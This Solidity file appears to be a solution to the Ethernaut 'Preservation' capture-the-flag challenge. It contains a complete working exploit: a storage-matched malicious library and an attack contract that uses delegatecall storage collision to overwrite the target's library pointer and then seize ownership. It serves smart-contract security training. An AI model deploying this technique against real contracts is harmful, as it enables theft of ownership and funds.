// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title IPreservation
 * @dev Interface for the Preservation contract from the Ethernaut CTF challenge
 */
interface IPreservation {
    /**
     * @dev Sets the time for timezone 1
     * @param _timeStamp The timestamp value to set
     */
    function setFirstTime(uint256 _timeStamp) external;
    
    /**
     * @dev Sets the time for timezone 2
     * @param _timeStamp The timestamp value to set
     */
    function setSecondTime(uint256 _timeStamp) external;
    
    /**
     * @dev Returns the current owner
     * @return The address of the current owner
     */
    function owner() external view returns (address);
}

/**
 * @title MaliciousLibrary
 * @dev Malicious library contract that matches the storage layout of the Preservation contract
 * @notice This contract will be used to exploit the vulnerability in the Preservation contract
 */
contract MaliciousLibrary {
    // This contract must maintain the same storage layout as the Preservation contract
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2
    uint256 storedTime;              // slot 3
    
    /**
     * @dev Function that will be delegatecalled by the Preservation contract
     * @param _time Used to set the owner address (cast from uint256 to address)
     */
    function setTime(uint256 _time) public {
        // When called via delegatecall, this will modify the owner variable of the Preservation contract
        owner = address(uint160(_time));
    }
}

/**
 * @title PreservationExploit
 * @dev Solution contract for the Preservation Ethernaut challenge
 * @notice This contract exploits the delegatecall vulnerability in the Preservation contract
 * @custom:security-contact security@example.com
 */
contract PreservationExploit {
    /// @notice Reference to the target Preservation contract
    IPreservation public preservation;
    
    /// @notice Address of the malicious library
    MaliciousLibrary public maliciousLibrary;
    
    /// @notice Address of the owner of this exploit contract
    address public owner;
    
    /**
     * @dev Constructor sets the address of the Preservation contract to exploit
     * @param _preservationAddress The address of the deployed Preservation contract
     */
    constructor(address _preservationAddress) {
        preservation = IPreservation(_preservationAddress);
        maliciousLibrary = new MaliciousLibrary();
        owner = msg.sender;
    }
    
    /**
     * @dev Executes the exploit to take ownership of the Preservation contract
     */
    function exploit() external {
        require(msg.sender == owner, "Only owner can execute the exploit");
        
        // First step: Replace the timeZone1Library address with our malicious library address
        // This works because delegatecall preserves storage layout, and setTime modifies the first storage slot
        preservation.setFirstTime(uint256(uint160(address(maliciousLibrary))));
        
        // Second step: Call setFirstTime again, but now it will delegatecall our malicious library
        // Our malicious library will set the owner to this contract's address
        preservation.setFirstTime(uint256(uint160(address(this))));
    }
    
    /**
     * @dev Helper function to check if the exploit was successful
     * @return True if this contract is now the owner of the Preservation contract
     */
    function checkSuccess() external view returns (bool) {
        return preservation.owner() == address(this);
    }
}
